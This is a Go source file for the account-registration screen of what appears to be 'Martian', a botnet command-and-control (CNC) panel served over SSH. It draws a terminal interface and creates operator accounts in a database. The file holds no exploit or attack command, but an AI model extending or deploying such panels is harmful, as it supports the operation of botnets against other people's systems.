package views

import (
	"GoEYE"
	"Martian/src/database"
	"Martian/src/functions"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

// Welcomes the new founded connection onto Martian CNC
func NewRegisterConnection(channel ssh.Channel, connection *ssh.ServerConn) error {

	// Adjusts the terminals connection window size
	if _, err := channel.Write([]byte("\033c" + "\033[8;30;80t")); err != nil {
		return err
	}

	// Allocated 50 ms for window resizing
	time.Sleep(50 * time.Millisecond)

	// Allocated a channel for closing goroutines
	cancel := make(chan struct{})

	// Runs the marquee for the marquee system at the bottom of the screen
	go functions.MarqueeText(channel, "\x1b[0m│", "Welcome to martian, FBs latest Zee an Zee", 29, 1, 78, 70, "\x1b[0m│", cancel)

	eye := GoEYE.GoEYE(channel, channel, GoEYE.DefaultStyle) // Creates our terminal style
	eye.MakeButton(true,  26, 3,  26, "LOGIN",    		"\x1b[48;5;10m\x1b[38;5;16m",  	"\x1b[0m", GoEYE.DefaultStyle) // Login button
	eye.MakeButton(true,  26, 29, 52, "SUBMIT", 	    "\x1b[48;5;11m\x1b[38;5;16m", 	"\x1b[0m", GoEYE.DefaultStyle) // Register button
	eye.MakeButton(true,  26, 55, 78, "EXIT",     		"\x1b[48;5;9m\x1b[38;5;16m", 	"\x1b[0m", GoEYE.DefaultStyle) // Exit button
	eye.MakeButton(true,  23, 29, 52, "INFORMATION",    "\x1b[48;5;11m\x1b[38;5;16m", 	"\x1b[0m", GoEYE.DefaultStyle) // Exit button
	eye.MakeButton(false, 1,  3,  11, "Martian",		"", 	 		  	            "",    GoEYE.DefaultStyle)
	

	eye.MakeButton(true, 13, 20, 61, "type username here", "", "", GoEYE.DefaultStyle)
	eye.MakeButton(true, 16, 20, 61, "type password here", "", "", GoEYE.DefaultStyle)
	eye.MakeButton(true, 19, 20, 61, "type email here", "", "", GoEYE.DefaultStyle)
	eye.MakeButton(true, 16, 63, 65, "x", "", "", GoEYE.DefaultStyle)

	// Makes the box with the position
	if err := eye.Init(80, 80); err != nil {
		return err
	}

	channel.Write([]byte("\033[4;20f                       _   _             "))				// Little login banner
	channel.Write([]byte("\033[5;20f                      | | (_)            "))				// Little login banner
	channel.Write([]byte("\033[6;20f  _ __ ___   __ _ _ __| |_ _  __ _ _ __  "))				// Little login banner
	channel.Write([]byte("\033[7;20f | '_ ` _ \\ / _` | '__| __| |/ _` | '_ \\ "))				// Little login banner
	channel.Write([]byte("\033[8;20f | | | | | | (_| | |  | |_| | (_| | | | |"))				// Little login banner
	channel.Write([]byte("\033[9;20f |_| |_| |_|\\__,_|_|   \\__|_|\\__,_|_| |_|"))				// Little login banner
	channel.Write([]byte("\033[10;20f    \x1b[4mplease create to your account below\x1b[0m"))	// Little login banner

	// Writes the marquee system for the element
	channel.Write([]byte("\033[28;0f├"+ strings.Repeat("─", 78)+"┤"))
	channel.Write([]byte("\033[0;3f \x1b[4mMartian\x1b[0m "))

	// Channel for feteching the information
	str := make(chan *GoEYE.Event)


	var cursor chan struct{} = make(chan struct{})

	// Runs the mouse cursor event
	go eye.WaitEvent(str, cursor) 

	var ( // Stores needed information throughout the system
		Username string = "" // Stroes the username
		Password string = "" // Stores the password
		Email	 string = "" // Stores the email
		ShowingPass bool = false
	)

	for {
		button := <-str // Fetchs the method from the homePage

		// Only allows for valid cursor clicking on the home page buttons
		if button.Type != GoEYE.LeftClick && button.Type != GoEYE.RightClick {
			continue
		}


		// Controls our different routes for each button
		switch button.ButtonOccured.Label {

		case "SUBMIT": // Submits the registration form

			// Checks if a user already exists
			user, err := database.System.FetchUser(Username)
			if err == nil && user != nil { // found
				Username = "" // Resets the user field
				channel.Write([]byte("\033[13;32f\x1b[48;5;9m\x1b[38;5;16m username taken \x1b[0m")); continue
			}

			if len(Username) <= 0 { // Invalid username prompt is dipslayed here
				channel.Write([]byte("\033[13;32f\x1b[48;5;9m\x1b[38;5;16m invalid username \x1b[0m")); continue
			}

			if len(Password) <= 0 { // Invalid password prompt is dipslayed here
				channel.Write([]byte("\033[16;32f\x1b[48;5;9m\x1b[38;5;16m invalid password \x1b[0m")); continue
			}

			// Makes the user inside the database and ensures its done
			if _, err := database.System.MakeUser(Username, Password, Email); err != nil {
				channel.Write([]byte("\033[13;32f\x1b[48;5;9m\x1b[38;5;16m creation error \x1b[0m")); 
				channel.Write([]byte("\033[16;32f\x1b[48;5;9m\x1b[38;5;16m creation error \x1b[0m")); 
				channel.Write([]byte("\033[19;32f\x1b[48;5;9m\x1b[38;5;16m creation error \x1b[0m")); 
				continue
			}

			cancel <- struct{}{}
			cursor <- struct{}{}
			return NewLoginConnection(channel, connection) // Redirects to the login page


		case "HOME", "Martian":
			cancel <- struct{}{}
			cursor <- struct{}{}
			return NewWelcomedConnection(channel, connection)

		case "EXIT": // exit button
			cancel <- struct{}{}
			cursor <- struct{}{}
			return channel.Close()

		case "LOGIN": // login button
		cancel <- struct{}{}
		cursor <- struct{}{}
			return NewLoginConnection(channel, connection)

		case "type username here": // Username box clicked
			cursor <- struct{}{}

			// Reads the username from the channel and ensures its done
			User, err := functions.ReadFromChannel(channel, 40, false, 13, 21, Username)
			if err != nil {
				cancel <- struct{}{}
				return err
			}

			Username = User // Updates the store
			go eye.WaitEvent(str, cursor)
		case "type password here": // Password box clicked
			cursor <- struct{}{}

			// Reads the password from the channel and ensures its done
			Pass, err := functions.ReadFromChannel(channel, 40, true, 16, 21, Password)
			if err != nil {
				cancel <- struct{}{}
				return err
			}

			Password = Pass // Updates the store
			go eye.WaitEvent(str, cursor)
		case "type email here": // Email box clicked
			cursor <- struct{}{}

			// Reads the password from the channel and ensures its done
			Eml, err := functions.ReadFromChannel(channel, 40, false, 19, 21, Email)
			if err != nil {
				cancel <- struct{}{}
				return err
			}
			
			Email = Eml // Updates the store
			go eye.WaitEvent(str, cursor)

		case "x": // Showing or hiding the password funciton

			if !ShowingPass {
				button.ButtonOccured.UpdateLabel(" ", "")
				ShowingPass = true

				channel.Write([]byte("\x1b[s\x1b[16;21f"+Password+"\x1b[u"))
			} else {
				button.ButtonOccured.UpdateLabel("x", "")
				ShowingPass = false

				channel.Write([]byte("\x1b[s\x1b[16;21f"+strings.Repeat(functions.MaskCharater, len(Password))+"\x1b[u"))
			}
		}
	}

}